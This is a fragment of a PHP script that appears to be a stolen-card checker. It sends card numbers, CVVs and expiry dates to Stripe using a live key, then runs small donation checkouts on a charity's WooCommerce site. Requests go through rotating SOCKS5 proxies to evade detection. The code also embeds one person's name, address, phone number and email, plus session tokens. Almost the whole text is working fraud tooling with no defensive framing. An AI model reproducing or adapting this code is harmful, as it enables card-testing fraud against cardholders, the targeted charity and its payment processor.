...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Ilham+Arifin&owner[address][line1]=4984++Polk+Street&owner[address][state]=AZ&owner[address][city]=Tucson&owner[address][postal_code]=85714&owner[address][country]=US&owner[email]=ilhm.arfn%40yandex.com&owner[phone]=3214351124&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=89240119-3b35-40ac-99f5-3ac39673382fe84bc1&muid=a4b12efc-def8-4f93-b255-dc5baa35c484c5e22b&sid=74294b3b-e80c-4189-beb3-974cb23ff2f6f3feb4&pasted_fields=number&payment_user_agent=stripe.js%2Fcac019f9f%3B+stripe-js-v3%2Fcac019f9f&time_on_page=66903&referrer=https%3A%2F%2Faxis.org%2F&key=pk_live_idwIm4eJUSpyYZLoCD0fWDrq');
...
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://axis.org/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
...
'origin: https://axis.org',
'referer: https://axis.org/donate/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
...
curl_setopt($ch, CURLOPT_POSTFIELDS,'attribute_suggested-amounts=Other&nyp-opc-33113=%241.00&quantity=1&add-to-cart=33113&product_id=33113&variation_id=33129&attribute_suggested-amounts=%2425&nyp-opc-33794=&quantity=1&add-to-cart=33794&product_id=33794&variation_id=33795&billing_first_name=Ilham&billing_last_name=Arifin&billing_company=&billing_country=US&billing_address_1=4984++Polk+Street&billing_address_2=&billing_city=Tucson&billing_state=AZ&billing_postcode=85714&billing_phone=3214351124&billing_email=ilhm.arfn%40yandex.com&order_comments=&is_opc=1&cart%5B34db98826d883060715fad5ee407bdbf%5D%5Bqty%5D=1&payment_method=stripe&terms=on&terms-field=1&woocommerce-process-checkout-nonce=6820df70b4&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source=src_1JALGfHWkN7Doln82ClawBZA');
